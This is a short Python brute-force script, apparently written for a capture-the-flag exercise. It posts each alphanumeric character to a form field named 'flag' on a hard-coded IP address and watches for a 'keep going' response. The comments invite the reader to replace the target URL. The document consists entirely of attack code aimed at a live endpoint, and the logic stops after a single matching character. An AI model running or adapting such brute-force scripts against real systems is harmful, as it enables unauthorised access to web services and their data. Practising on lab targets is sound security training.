import requests

target_url = "http://141.85.224.118:8084/trial.html"  # Replace with the target URL
php_prompt_name = "flag"  # Replace with the name of the PHP prompt
expected_response = "keep going"  # Replace with the expected response from the page

# Define the character set you want to use for the brute force
character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Iterate through each character in the character set
for char in character_set:
    payload = {php_prompt_name: char}
    response = requests.post(target_url, data=payload)
    
    # Check the response to determine if the brute force attempt was successful
    if response.status_code == 200 and expected_response in response.text:
        print(f"Brute force successful! Character found: {char}")
        break
    
    # Print the current character being tried
    print(f"Tried character: {char}")